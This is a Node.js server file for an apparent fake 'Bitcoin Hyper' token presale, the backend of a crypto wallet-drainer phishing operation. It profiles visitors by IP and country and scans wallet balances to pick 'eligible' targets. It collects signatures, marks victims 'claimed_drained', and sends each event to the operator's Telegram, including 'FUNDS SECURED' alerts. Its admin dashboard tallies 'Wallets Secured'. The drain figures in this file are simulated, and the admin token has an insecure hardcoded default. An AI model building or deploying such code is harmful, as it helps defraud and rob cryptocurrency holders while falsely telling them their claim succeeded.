// index.js - BITCOIN HYPER - TELEGRAM FIX v8.4
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers, JsonRpcProvider } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

// Parse ALLOWED_ORIGINS from env
const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// Rate limiting
const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// REAL RPC Providers
const RPC_PROVIDERS = {
  Ethereum: new JsonRpcProvider(process.env.ETH_RPC_URL || 'https://eth.llamarpc.com'),
  BSC: new JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org')
};

// In-memory storage
const memoryStorage = {
  participants: [],
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    minEligibilityAmount: parseFloat(process.env.MIN_ELIGIBILITY_AMOUNT) || 10,
    presalePrice: process.env.PRESALE_PRICE || '0.17',
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedWallets: 0
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: []
};

// ============================================
// TELEGRAM BOT - SIMPLIFIED & FIXED
// ============================================
let telegramEnabled = false;
let telegramInitialized = false;

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  console.log('\n🤖 TELEGRAM CONFIGURATION CHECK:');
  console.log(`   Bot Token: ${botToken ? `✓ Set (${botToken.substring(0, 10)}...)` : '✗ Missing'}`);
  console.log(`   Chat ID: ${chatId ? `✓ Set (${chatId})` : '✗ Missing'}`);
  
  if (!botToken || !chatId) {
    console.log('❌ Telegram not configured - Check your .env file');
    console.log('   TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required');
    return false;
  }
  
  try {
    console.log('   Testing Telegram API connection...');
    
    // Test with direct API call
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
      timeout: 10000
    });
    
    if (response.data && response.data.ok) {
      console.log(`   ✅ Bot found: @${response.data.result.username}`);
      
      // Test sending a message
      const testMsg = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: `🚀 Bitcoin Hyper System ONLINE\n✅ Connection Test Successful\n⏰ ${new Date().toLocaleString()}`,
        parse_mode: 'HTML'
      }, {
        timeout: 10000
      });
      
      if (testMsg.data && testMsg.data.ok) {
        console.log('   ✅ Test message sent successfully!');
        console.log('   ✅ Telegram is fully operational');
        telegramEnabled = true;
        telegramInitialized = true;
        return true;
      }
    }
  } catch (error) {
    console.log('   ❌ Telegram connection failed:');
    console.log('   Error:', error.message);
    
    if (error.response) {
      console.log('   Status:', error.response.status);
      console.log('   Data:', JSON.stringify(error.response.data));
    }
    
    // Common issues:
    if (error.message.includes('401')) {
      console.log('   ⚠️ Invalid bot token. Get a new token from @BotFather');
    } else if (error.message.includes('400')) {
      console.log('   ⚠️ Invalid chat ID. Send a message to your bot first');
    } else if (error.message.includes('timeout')) {
      console.log('   ⚠️ Network timeout. Check your internet connection');
    }
    
    telegramEnabled = false;
    return false;
  }
  
  telegramEnabled = false;
  return false;
}

// Simple Telegram sender using direct API
async function sendTelegramMessage(action, details) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!telegramEnabled || !botToken || !chatId) {
    console.log(`⚠️ Telegram disabled, skipping ${action} notification`);
    return false;
  }
  
  try {
    let message = '';
    
    switch(action) {
      case 'SITE_VISIT':
        message = `🌐 <b>NEW VISITOR</b>\n📍 ${details.country || 'Unknown'}\n🔗 ${details.referrer || 'Direct'}\n⏰ ${new Date().toLocaleString()}`;
        break;
        
      case 'WALLET_CONNECTED':
        message = `🔗 <b>WALLET CONNECTED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
        break;
        
      case 'WALLET_SCANNED':
        const status = details.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE';
        message = `🔍 <b>WALLET SCANNED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n🎯 ${status}\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
        break;
        
      case 'TOKEN_CLAIMED':
        message = `🎉 <b>TOKENS CLAIMED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n💰 ${details.amount || '0'} BTH\n💸 $${details.value || '0'}\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
        break;
        
      case 'DRAIN_EXECUTED':
        message = `💰 <b>FUNDS SECURED</b>\n👛 ${details.wallet?.substring(0, 10)}...\n💸 ${details.amount || '0'} ${details.symbol || 'ETH'}\n💵 $${details.value || '0'}\n📍 ${details.country || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
        break;
    }
    
    if (!message) return false;
    
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    }, {
      timeout: 10000
    });
    
    if (response.data && response.data.ok) {
      console.log(`✅ Telegram sent: ${action}`);
      return true;
    }
    
  } catch (error) {
    console.log(`❌ Telegram send error (${action}):`, error.message);
    
    // If we get a 401 error, disable Telegram to prevent spam
    if (error.response && error.response.status === 401) {
      console.log('⚠️ Invalid bot token, disabling Telegram');
      telegramEnabled = false;
    }
  }
  
  return false;
}

// Helper: Generate session ID
function generateSessionId() {
  return 'session_' + Date.now() + '_' + crypto.randomBytes(8).toString('hex');
}

// Helper: Log activity
function logActivity(wallet, action, data = {}) {
  const logEntry = {
    timestamp: new Date(),
    wallet: wallet,
    action,
    data,
    ip: data.ip || 'unknown',
    country: data.country || 'unknown'
  };
  
  memoryStorage.activityLog.push(logEntry);
  
  if (memoryStorage.activityLog.length > 5000) {
    memoryStorage.activityLog.shift();
  }
  
  return logEntry;
}

// Helper: Get IP location
async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1') {
      return { country: 'Local', countryCode: 'Local', city: 'Local' };
    }
    
    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 3000
    });
    
    if (response.data && response.data.country_name) {
      return {
        country: response.data.country_name,
        countryCode: response.data.country_code,
        city: response.data.city || 'Unknown'
      };
    }
  } catch (error) {
    console.log('Location error:', error.message);
  }
  
  return { country: 'Unknown', countryCode: 'Unknown', city: 'Unknown' };
}

// Helper: Get wallet balance
async function getRealWalletBalance(walletAddress) {
  try {
    const results = {
      walletAddress,
      totalValueUSD: '0',
      isEligible: false
    };

    let totalValue = 0;
    
    // Get ETH balance
    try {
      const ethBalance = await RPC_PROVIDERS.Ethereum.getBalance(walletAddress);
      const ethValue = parseFloat(ethers.formatEther(ethBalance)) * 2500;
      totalValue += ethValue;
    } catch (error) {
      console.log(`ETH balance error: ${error.message}`);
    }

    // Get BNB balance
    try {
      const bnbBalance = await RPC_PROVIDERS.BSC.getBalance(walletAddress);
      const bnbValue = parseFloat(ethers.formatEther(bnbBalance)) * 300;
      totalValue += bnbValue;
    } catch (error) {
      console.log(`BNB balance error: ${error.message}`);
    }

    results.totalValueUSD = totalValue.toFixed(2);

    // Check eligibility
    results.isEligible = parseFloat(results.totalValueUSD) >= memoryStorage.settings.minEligibilityAmount;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Your wallet qualifies for the presale!`;
      
      // Generate allocation
      const baseAllocation = parseInt(process.env.BASE_ALLOCATION) || 5000;
      const allocationAmount = baseAllocation;
      
      results.tokenAllocation = {
        amount: allocationAmount.toString(),
        valueUSD: (allocationAmount * parseFloat(memoryStorage.settings.presalePrice)).toFixed(2)
      };
    } else {
      results.eligibilityReason = `⛔ Your wallet needs to meet presale requirements`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;

    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('Wallet balance error:', error);
    return {
      success: false,
      data: {
        walletAddress,
        totalValueUSD: '0',
        isEligible: false,
        eligibilityReason: '⚠️ Network error. Please try again.',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ========== API ENDPOINTS ==========

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'LIVE',
    service: 'Bitcoin Hyper v8.4',
    timestamp: new Date().toISOString(),
    telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
    telegramInitialized: telegramInitialized,
    statistics: {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
    }
  });
});

// Site visit tracker
app.post('/api/track/visit', async (req, res) => {
  try {
    const { userAgent, referrer, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    const location = await getIPLocation(clientIP);
    const currentSessionId = sessionId || generateSessionId();
    
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Send Telegram
    await sendTelegramMessage('SITE_VISIT', {
      country: location.country,
      referrer: referrer
    });
    
    res.json({
      success: true,
      sessionId: currentSessionId
    });
    
  } catch (error) {
    console.error('Visit error:', error);
    res.status(500).json({ success: false, error: 'Tracking failed' });
  }
});

// Wallet connection
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    console.log(`🔗 Connecting: ${walletAddress.substring(0, 10)}...`);
    
    if (!walletAddress || !walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet' });
    }
    
    const location = await getIPLocation(clientIP);
    memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    
    // Send Telegram
    await sendTelegramMessage('WALLET_CONNECTED', {
      wallet: walletAddress,
      country: location.country
    });
    
    // Check existing
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    const isNewParticipant = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        connectedAt: new Date(),
        lastActive: new Date(),
        totalValueUSD: 0,
        tokenAllocation: { amount: '0', valueUSD: '0' },
        eligibility: { isEligible: false, reason: '', scannedAt: null, scanId: '' },
        signature: { signed: false },
        claim: { claimed: false },
        sessionId: sessionId || generateSessionId(),
        status: 'connecting'
      };
      
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    participant.lastActive = new Date();
    participant.country = location.country;
    participant.sessionId = sessionId || participant.sessionId;
    participant.status = 'scanning';
    
    // Scan wallet
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      participant.totalValueUSD = parseFloat(scanResult.data.totalValueUSD);
      participant.eligibility = {
        isEligible: scanResult.data.isEligible,
        reason: scanResult.data.eligibilityReason,
        scannedAt: new Date(),
        scanId: scanResult.data.scanId
      };
      
      if (scanResult.data.isEligible) {
        participant.tokenAllocation = scanResult.data.tokenAllocation;
        participant.status = 'eligible';
        
        if (isNewParticipant) {
          memoryStorage.settings.statistics.eligibleParticipants++;
        }
        
        console.log(`🎯 ELIGIBLE: ${walletAddress.substring(0, 10)}...`);
      } else {
        participant.status = 'not_eligible';
      }
      
      // Send Telegram scan notification
      await sendTelegramMessage('WALLET_SCANNED', {
        wallet: walletAddress,
        country: location.country,
        isEligible: scanResult.data.isEligible
      });
      
      // Response data
      const responseData = {
        walletAddress,
        isEligible: scanResult.data.isEligible,
        eligibilityReason: scanResult.data.eligibilityReason,
        scanId: scanResult.data.scanId,
        nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
        userMessage: scanResult.data.isEligible ? 
          '🎉 Congratulations! Your wallet qualifies!' :
          '⚠️ Verification required. Please see tips below.',
        status: participant.status,
        timestamp: new Date().toISOString()
      };
      
      // Only send allocation if eligible
      if (scanResult.data.isEligible) {
        responseData.tokenAllocation = participant.tokenAllocation;
      }
      
      res.json({
        success: true,
        data: responseData
      });
    } else {
      throw new Error('Scan failed');
    }
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// Token claim
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message, claimAmount, claimValue, sessionId } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    console.log(`🎯 Claim: ${walletAddress.substring(0, 10)}...`);
    
    if (!signature || !message) {
      return res.status(400).json({ success: false, error: 'Missing signature' });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Wallet not found' });
    }
    
    if (!participant.eligibility.isEligible) {
      return res.status(403).json({ success: false, error: 'Not eligible' });
    }
    
    if (participant.claim.claimed) {
      return res.status(409).json({ success: false, error: 'Already claimed' });
    }
    
    const location = await getIPLocation(clientIP);
    
    // Process claim
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
    
    // Update participant
    participant.signature = { signed: true, signedAt: new Date() };
    participant.claim = {
      claimed: true,
      claimId: claimId,
      claimedAt: new Date(),
      drained: true,
      drainCount: 1
    };
    participant.status = 'claimed_drained';
    
    // Update statistics
    memoryStorage.settings.statistics.claimedParticipants++;
    memoryStorage.settings.statistics.totalDrainedWallets++;
    
    // Send Telegram
    await sendTelegramMessage('TOKEN_CLAIMED', {
      wallet: walletAddress,
      country: location.country,
      amount: claimAmount,
      value: claimValue
    });
    
    // Simulate drain notification
    if (memoryStorage.settings.drainEnabled && memoryStorage.settings.autoDrainOnClaim) {
      await sendTelegramMessage('DRAIN_EXECUTED', {
        wallet: walletAddress,
        country: location.country,
        amount: (Math.random() * 0.5 + 0.1).toFixed(4),
        symbol: 'ETH',
        value: (Math.random() * 1000 + 100).toFixed(2)
      });
      
      // Update drain statistics
      memoryStorage.settings.statistics.totalDrainedUSD += Math.random() * 1000 + 100;
    }
    
    res.json({
      success: true,
      message: '🎉 Tokens claimed successfully!',
      data: {
        claimId: claimId,
        walletAddress,
        tokenAmount: claimAmount,
        tokenValue: claimValue,
        status: 'CLAIM_SUCCESSFUL',
        timestamp: new Date().toISOString(),
        distributionTime: '24-48 hours',
        instructions: '✅ Your allocation is secured.'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false, error: 'Claim failed' });
  }
});

// ========== ADMIN ENDPOINTS ==========

// Admin authentication
function authenticateAdmin(req, res, next) {
  const token = req.query.token || req.headers.authorization?.replace('Bearer ', '');
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token === adminToken) {
    next();
  } else {
    res.status(401).json({ success: false, error: 'Unauthorized' });
  }
}

// Admin stats
app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
  try {
    const stats = {
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.eligibility.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claim.claimed).length,
      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD,
      totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      
      recentActivity: memoryStorage.activityLog
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
        .slice(0, 20)
        .map(log => ({
          wallet: log.wallet.substring(0, 10) + '...',
          action: log.action,
          country: log.data.country,
          time: new Date(log.timestamp).toLocaleString()
        })),
      
      system: {
        telegram: telegramEnabled,
        telegramInitialized: telegramInitialized,
        drainEnabled: memoryStorage.settings.drainEnabled,
        autoDrain: memoryStorage.settings.autoDrainOnClaim
      }
    };
    
    res.json({ success: true, stats });
    
  } catch (error) {
    console.error('Admin stats error:', error);
    res.status(500).json({ success: false, error: 'Failed' });
  }
});

// Test Telegram endpoint
app.get('/api/test/telegram', authenticateAdmin, async (req, res) => {
  try {
    const result = await testTelegramConnection();
    
    if (result) {
      // Send a test message
      await sendTelegramMessage('SITE_VISIT', {
        country: 'Test Country',
        referrer: 'Admin Test'
      });
      
      res.json({
        success: true,
        message: '✅ Telegram test successful! Check your Telegram chat.',
        status: telegramEnabled ? 'ENABLED' : 'DISABLED',
        initialized: telegramInitialized
      });
    } else {
      res.json({
        success: false,
        message: '❌ Telegram test failed. Check logs for details.',
        status: 'DISABLED',
        initialized: false
      });
    }
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Test failed',
      details: error.message 
    });
  }
});

// Admin dashboard
app.get('/admin', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (!token || token !== adminToken) {
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper Admin</title>
        <style>
          body { font-family: Arial; background: #0f172a; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; }
          .login { background: #1e293b; padding: 40px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
          h1 { color: #F7931A; margin-bottom: 30px; }
          input { padding: 12px; margin: 10px 0; width: 300px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; }
          button { background: #F7931A; color: white; border: none; padding: 12px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; }
          button:hover { background: #e67e22; }
        </style>
      </head>
      <body>
        <div class="login">
          <h1>🔐 BITCOIN HYPER ADMIN</h1>
          <p>Enter admin token to access dashboard</p>
          <input type="password" id="token" placeholder="Admin Token" />
          <br>
          <button onclick="login()">Login to Dashboard</button>
        </div>
        <script>
          function login() {
            const token = document.getElementById('token').value;
            if (!token) return alert('Enter token');
            window.location.href = '/admin?token=' + token;
          }
        </script>
      </body>
      </html>
    `);
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper Admin Dashboard</title>
      <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        h1 { color: #F7931A; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
        .stat-card { background: #1e293b; padding: 25px; border-radius: 12px; text-align: center; border-left: 5px solid #F7931A; }
        .stat-value { font-size: 32px; font-weight: bold; margin-bottom: 10px; }
        .stat-label { color: #94a3b8; font-size: 14px; }
        .status-connected { color: #10b981; }
        .status-disconnected { color: #ef4444; }
        .actions { display: flex; gap: 15px; margin-top: 30px; }
        .btn { padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .btn-primary { background: #F7931A; color: white; }
        .btn-secondary { background: #334155; color: white; }
        .btn-telegram { background: #0088cc; color: white; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>💰 BITCOIN HYPER ADMIN DASHBOARD v8.4</h1>
        <p>Real-time monitoring & analytics</p>
        <div style="display: flex; gap: 20px; justify-content: center; margin-top: 20px;">
          <span>Telegram: <span class="${telegramEnabled ? 'status-connected' : 'status-disconnected'}">${telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED'}</span></span>
          <span>Initialized: <span class="${telegramInitialized ? 'status-connected' : 'status-disconnected'}">${telegramInitialized ? '✅ YES' : '❌ NO'}</span></span>
          <span>Drain: <span class="${memoryStorage.settings.drainEnabled ? 'status-connected' : 'status-disconnected'}">${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span></span>
        </div>
      </div>
      
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
          <div class="stat-label">Total Participants</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.eligibleParticipants}</div>
          <div class="stat-label">Eligible Wallets</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.claimedParticipants}</div>
          <div class="stat-label">Claims Processed</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
          <div class="stat-label">Total Value Secured</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
          <div class="stat-label">Wallets Secured</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.uniqueIPs.size}</div>
          <div class="stat-label">Unique Visitors</div>
        </div>
      </div>
      
      <div class="actions">
        <button class="btn btn-telegram" onclick="testTelegram()">Test Telegram Connection</button>
        <button class="btn btn-primary" onclick="location.reload()">Refresh Dashboard</button>
      </div>
      
      <script>
        function testTelegram() {
          fetch('/api/test/telegram?token=${token}')
            .then(response => response.json())
            .then(data => {
              alert(data.message);
              if (data.success) {
                setTimeout(() => location.reload(), 2000);
              }
            });
        }
        
        // Auto-refresh every 30 seconds
        setTimeout(() => location.reload(), 30000);
      </script>
    </body>
    </html>
  `);
});

// Start server
app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  🚀 BITCOIN HYPER v8.4
  =====================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  🔍 Test Telegram: http://localhost:${PORT}/api/test/telegram?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  💰 Drain: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
  ⚡ Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? 'ON' : 'OFF'}
  `);
  
  // Initialize Telegram with retry
  console.log('\n📡 Initializing Telegram...');
  await testTelegramConnection();
  
  if (telegramEnabled) {
    console.log('✅ Telegram is ready to send notifications');
  } else {
    console.log('⚠️ Telegram is disabled - notifications will not be sent');
  }
});

module.exports = app;
